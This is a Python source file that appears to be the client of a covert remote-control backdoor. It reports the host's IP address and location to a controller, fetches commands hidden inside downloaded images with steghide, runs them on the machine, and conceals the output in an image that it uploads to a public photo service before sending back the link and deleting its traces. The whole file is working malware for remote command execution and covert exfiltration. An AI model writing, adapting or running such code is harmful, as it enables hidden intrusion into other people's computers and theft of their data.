import socket
import subprocess
import argparse
import sys
import time
import threading
import requests
import os
import base64
import json
import re
def init():
    os.system('@echo off&cd steghide&del tmp.txt&cd ..&del tmp.txt &del command.jpg')
def downandload(img_url):

    headers={
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,image/apng,*/*q=0.8,application/signed-exchangev=b3q=0.9",
    "Accept-Language": "zh-CN,zhq=0.9"
        }
    r = requests.get(img_url, headers=headers, stream=True)
    print(r.status_code) # 返回状态码
    if r.status_code == 200:
        open('command.jpg', 'wb').write(r.content) # 将内容写入图片
        print("down:done")
    os.system('cd steghide&steghide extract -sf ../command.jpg  -p shadowwolf&copy tmp.txt ..\&cd ..')
def getip():
    url = 'https://www.baidu.com/s?ie=UTF-8&wd=ip'
    headers={
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,image/apng,*/*q=0.8,application/signed-exchangev=b3q=0.9",
    "Accept-Language": "zh-CN,zhq=0.9"
        }
    r = requests.get(url,headers=headers)
    text=r.text
    ip=re.findall('本机IP:\&nbsp\;(.*)\<\/span\>',text)
    weizhi=re.findall(ip[0]+'\<\/span\>(.*)\t',text)
    t="IP:"+ip[0]+"|位置:"+weizhi[0]
    return t
def upload_result():
    request_url = 'http://mp.toutiao.com/upload_photo/?type=json'
    headers={
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,image/apng,*/*q=0.8,application/signed-exchangev=b3q=0.9",
    "Accept-Language": "zh-CN,zhq=0.9"
        }

    files = {'photo': ('result.jpg', open('result.jpg', 'rb'), 'image/jpeg')}
    r = requests.post(request_url, headers=headers, files=files)
    result= json.loads(r.text)
    return result['web_url']
   
def connectHost(ht,pt):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ht,int(pt)))
    sock.send(getip().encode('utf-8'))
    while True:
        data = sock.recv(1024)
        data = data.decode('utf-8')
        if(data):
            downandload(data)
            file = open('tmp.txt',"r",encoding="utf-8",errors="ignore")
            mystr = file.readline()
            result =str(base64.b64encode(os.popen(mystr).read().encode('utf-8')).decode('utf-8'))
            with open('result.txt','w') as rs:
                rs.write(result)
            rs.close()
            text1='copy base.jpg result.jpg&cd steghide&steghide.exe embed -cf ..\\result.jpg -ef ..\\result.txt -p shadowwolf'
            os.system(text1)
            file.close()
            resu=upload_result()
            sock.send(resu.encode('utf-8'))
            os.popen('del tmp.txt&del result.txt&del result.jpg&del steghide\\tmp.txt')
            time.sleep(1)
            sock.close()


def main():
    host='服务器端ip'#服务器端ip
    port='服务器端port' #服务器端port
    connectHost(host,port)              #连接到控制端


if __name__ == '__main__':
    init()
    main()
